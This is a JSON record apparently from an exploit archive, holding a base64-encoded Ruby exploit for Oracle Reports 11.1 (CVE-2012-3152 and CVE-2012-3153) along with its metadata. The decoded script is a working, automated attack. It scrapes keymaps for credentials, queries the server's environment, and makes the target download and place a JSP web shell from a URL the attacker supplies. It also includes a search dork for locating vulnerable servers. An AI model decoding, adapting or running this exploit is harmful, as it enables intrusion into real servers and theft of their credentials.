{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcnVieQ0KDQojIEV4cGxvaXQgVGl0bGU6IE9yYWNsZSBSZXBvcnRzIDExLjENCiMgQWJvdXQ6IEF1dG9tYXRlZCBleHBsb2l0IGZvciBDVkUtMjAxMi0zMTUzL0NWRS0yMDEyLTMxNTINCiMgR29vZ2xlIERvcms6IGludXJsOi9yZXBvcnRzL3J3c2VydmxldC8NCiMgRGF0ZTogMDEvMjgvMjAxNA0KIyBFeHBsb2l0IEF1dGhvcjogTWVrYW5pc21lbiA8bWF0dGlhc0Bnb3Ryb290LmV1Pg0KIyBDcmVkaXRzIHRvOiBAbWlzc19zdWRvIGZvciBpbml0aWFsIGRpc2Nsb3N1cmUNCiMgUmVmZXJlbmNlOiBodHRwOi8vbmV0aW5maWx0cmF0aW9uLmNvbS8NCiMgVmVuZG9yIEhvbWVwYWdlOiBodHRwOi8vd3d3Lm9yYWNsZS5jb20vDQojIFZlcnNpb246IDExLjENCiMgVGVzdGVkIG9uOiBMaW51eA0KIyBDVkUtMjAxMi0zMTUzDQojIENWRS0yMDEyLTMxNTINCg0KcmVxdWlyZSAndXJpJw0KcmVxdWlyZSAnb3Blbi11cmknDQpyZXF1aXJlICdvcGVuc3NsJw0KI09wZW5TU0w6OlNTTDo6VkVSSUZZX1BFRVIgPSBPcGVuU1NMOjpTU0w6OlZFUklGWV9OT05FDQoNCmRlZiB1cGxvYWRfcGF5bG9hZChkZXN0KQ0KICB1cmwgPSAiI3tAdXJsfS9yZXBvcnRzL3J3c2VydmxldD9yZXBvcnQ9dGVzdC5yZGYrZGVzZm9ybWF0PWh0bWwrZGVzdHlwZT1maWxlK2Rlc25hbWU9LyN7ZGVzdH0vaW1hZ2VzLyN7QHBheWxvYWRfbmFtZX0rSk9CVFlQRT1yd3VybCtVUkxQQVJBTUVURVI9JyN7QHBheWxvYWRfdXJsfSciDQogICNwcmludCB1cmwgDQogIGJlZ2luDQogIHVyaSA9IFVSSS5wYXJzZSh1cmwpDQogIGh0bWwgPSB1cmkub3Blbi5yZWFkDQogIHJlc2N1ZQ0KICAgIGh0bWwgPSAiIg0KICBlbmQNCiAgDQogIGlmIGh0bWwgPX4gL1N1Y2Nlc3NmdWxseSBydW4vDQogICAgQGhhY2tlZCA9IHRydWUNCiAgICBwcmludCAiWytdIFBheWxvYWQgdXBsb2FkZWQhXG4iDQogIGVsc2UNCiAgICBwcmludCAiWy1dIFBheWxvYWQgdXBsb2FkZWQgZmFpbGVkXG4iDQogIGVuZA0KZW5kDQoNCmRlZiBnZXRlbnYoc2VydmVyLCBhdXRoaWQpDQogIHByaW50ICJbK10gRm91bmQgc2VydmVyOiAje3NlcnZlcn1cbiINCiAgcHJpbnQgIlsrXSBGb3VuZCBjcmVkZW50aWFsczogI3thdXRoaWR9XG4iDQogIHByaW50ICJbKl0gUXVlcnlpbmcgc2hvd2VudiAuLi4gXG4iDQogIGJlZ2luDQogICAgdXJpID0gVVJJLnBhcnNlKCIje0B1cmx9L3JlcG9ydHMvcndzZXJ2bGV0L3Nob3dlbnY/c2VydmVyPSN7c2VydmVyfSZhdXRoaWQ9I3thdXRoaWR9IikNCiAgICBodG1sID0gdXJpLm9wZW4ucmVhZA0KICByZXNjdWUNCiAgICBodG1sID0gIiINCiAgZW5kDQoNCiAgaWYgaHRtbCA9fiAvXC8oLiopXC9zaG93ZW52LyANCiAgICBwcmludCAiWytdIFF1ZXJ5IHN1Y2NlZWRlZCwgdXBsb2FkaW5nIHBheWxvYWQgLi4uIFxuIg0KICAgIHVwbG9hZF9wYXlsb2FkKCQxKQ0KICBlbHNlDQogICAgcHJpbnQgIlstXSBRdWVyeSBmYWlsZWQuLi4gXG4iDQogIGVuZA0KZW5kDQoNCkBwYXlsb2FkX3VybCA9ICIiICAgICAgICAgI3RoZSB1cmwgdGhhdCBob2xkcyBvdXIgcGF5bG9hZCAod2UgY2FuIGV4ZWN1dGUgLmpzcCBvbiB0aGUgc2VydmVyKQ0KQHVybCA9ICIiICAgICAgICAgICAgICAgICAjdXJsIHRvIGNvbXByb21pc2UNCkBoYWNrZWQgPSBmYWxzZQ0KQHBheWxvYWRfbmFtZSA9ICgwLi4uOCkubWFwIHsgKCdhJy4uJ3onKS50b19hW3JhbmQoMjYpXSB9LmpvaW4gKyAiLmpzcCIgDQoNCnByaW50ICJbKl0gUFdOQUNMRSBGdXNpb24gLSBNZWthbmlzbWVuIDxtYXR0aWFzQGdvdHJvb3QuZXU+XG4iDQpwcmludCAiWypdIEF1dG9tYXRlZCBleHBsb2l0IGZvciBDVkUtMjAxMi0zMTUyIC8gQ1ZFLTIwMTItMzE1M1xuIg0KcHJpbnQgIlsqXSBDcmVkaXRzIHRvOiBAbWlzc19zdWRvXG4iDQoNCnVubGVzcyBBUkdWWzBdIGFuZCBBUkdWWzFdDQogIHByaW50ICJbLV0gVXNhZ2U6IC4vcHduYWNsZS5yYiB0YXJnZXRfdXJsIHBheWxvYWRfdXJsXG4iDQogIGV4aXQNCmVuZA0KDQpAdXJsID0gIEFSR1ZbMF0NCkBwYXlsb2FkX3VybCA9ICBBUkdWWzFdDQpwcmludCAiWypdIFRhcmdldCBVUkw6ICN7QHVybH1cbiINCnByaW50ICJbKl0gUGF5bG9hZCBVUkw6ICN7QHBheWxvYWRfdXJsfVxuIg0KcHJpbnQgIlsqXSBQYXlsb2FkIG5hbWU6ICN7QHBheWxvYWRfbmFtZX1cbiINCg0KYmVnaW4NCiNDYW4gd2UgdmlldyBrZXltYXBzPw0KdXJpID0gVVJJLnBhcnNlKCIje0B1cmx9L3JlcG9ydHMvcndzZXJ2bGV0L3Nob3dtYXAiKQ0KaHRtbCA9IHVyaS5vcGVuLnJlYWQNCnJlc2N1ZQ0KICBwcmludCAiWy1dIFVSTCBub3QgdnVsbmVyYWJsZSBvciB1bnJlYWNoYWJsZVxuIg0KICBleGl0DQplbmQNCg0KdGVzdCA9IGh0bWwuc2NhbigvPFNQQU4gY2xhc3M9T3JhSW5zdHJ1Y3Rpb25UZXh0PiguKik8XC9TUEFOPjxcL1REPi8pLmZsYXR0ZW4NCg0KI1BhcnNlIGtleW1hcHMgZm9yIHNlcnZlcnMNCnByaW50ICJbKl0gRW51bWVyYXRpbmcga2V5bWFwcyAuLi4gXG4iDQp0ZXN0LmVhY2ggZG8gfHR8DQogIGlmIG5vdCBAaGFja2VkDQogICAgdCA9IHQuZGVsZXRlKCcgJykNCiAgICB1cmwgPSAiI3tAdXJsfS9yZXBvcnRzL3J3c2VydmxldC9wYXJzZXF1ZXJ5PyN7dH0iDQoNCiAgYmVnaW4NCiAgICB1cmkgPSBVUkkucGFyc2UodXJsKQ0KICAgIGh0bWwgPSB1cmkub3Blbi5yZWFkDQogICAgcmVzY3VlDQogIGVuZA0KICANCiAgI3RvIGF1dG9tYXRlIGV4cGxvaXRhdGlvbiB3ZSBuZWVkIHRvIHF1ZXJ5IHNob3dlbnYgZm9yIGEgbG9jYWwgcGF0aA0KICAjd2UgbmVlZCBhIHNlcnZlciBpZCBhbmQgY3JlZHMgZm9yIHRoaXMsIHdlIGVudW1lcmF0ZSB0aGUga2V5bWFwcyBhbmQgaG9wZSBmb3IgdGhlIGJlc3QNCiAgI3Nob3dlbnYgdGVsbHMgdXMgdGhlIGxvY2FsIFBBVEggb2YgL3JlcG9ydHMvIHdoZXJlIHdlIHVwbG9hZCB0aGUgc2hlbGwNCiAgI3NvIHdlIGNhbiByZWFjaCBpdCBmcm9tIC9yZXBvcnRzL2ltYWdlcy88c2hlbGw+LmpzcCANCg0KICBpZiBodG1sID1+IC91c2VyaWQ9KC4qKUAvDQogICAgYXV0aGlkID0gJDENCiAgZW5kDQogIGlmIGh0bWwgPX4gL3NlcnZlcj0oXFMqKS8gDQogICAgc2VydmVyID0gJDENCiAgZW5kDQoNCiAgaWYgc2VydmVyIGFuZCBhdXRoaWQNCiAgICBnZXRlbnYoc2VydmVyLCBhdXRoaWQpDQogIGVuZA0KICBlbHNlDQogICAgYnJlYWsNCiAgZW5kDQplbmQNCg0KaWYgQGhhY2tlZA0KICBwcmludCAiWypdIFNlcnZlciBob3BlZnVsbHkgY29tcHJvbWlzZWQhXG4iDQogIHByaW50ICJbKl0gUGF5bG9hZCB1cmw6ICN7QHVybH0vcmVwb3J0cy9pbWFnZXMvI3tAcGF5bG9hZF9uYW1lfVxuIg0KZWxzZQ0KICBwcmludCAiWypdIEVudW1lcmF0aW9uIGRvbmUgLi4uIG5vIHZ1bG5lcmFibGUga2V5bWFwcyBmb3IgYXV0b21hdGljIGV4cGxvdGF0aW9uIGZvdW5kIDooXG4iDQogICNzZXJ2ZXIgaXMgc3RpbGwgdnVsbmVyYWJsZSBidXQgY2Fubm90IGJlIGF1dG9tYXRpY2FsbHkgZXhwbG9pdGVkIC4uLiBpIGd1ZXNzDQplbmQ=", 
    "filename": "platforms/jsp/remote/31253.rb", 
    "id": "31253", 
    "cves": [
        "CVE-2012-3153", 
        "CVE-2012-3152"
    ]
}